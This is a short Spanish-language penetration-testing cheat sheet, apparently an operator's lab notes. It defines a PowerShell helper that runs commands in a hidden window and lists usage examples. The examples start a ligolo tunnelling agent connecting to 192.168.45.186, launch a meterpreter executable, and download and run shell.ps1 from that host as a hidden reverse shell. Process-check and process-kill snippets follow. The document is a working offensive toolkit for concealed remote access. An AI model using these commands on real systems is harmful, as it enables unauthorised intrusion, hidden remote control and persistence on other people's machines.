#### funcion para ejecutar procesos en background y no bloquear el CLI

```powershell
function bg_exec($cmd) {
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c $cmd"
}
```

* Ejecucion Ejemplos: 

- ligolo-agent: `bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.186:11601 -ignore-cert"`

- meterpreter: ` bg_exec "C:\Users\eric.wallows\Documents\met.exe`

- powershell: `bg_exec "iwr -uri http://192.168.45.186/shell.ps1 -OutFile C:\temp\rev.ps1; powershell -nop -w hidden -c C:\temp\rev.ps1"`


#### Verificacion:

```powershell
Get-Process | ? { $_.Path -like "*ligolo*" }

# o

tasklist | findstr ligolo

```
#### Seleccion y manipulacion de procesos:

```powershell
Get-Process | Where-Object { $_.Name -like "*<process>*" } | Stop-Process -Force

Get-Process | ? { $_.Path -like "*<process>*" }
```
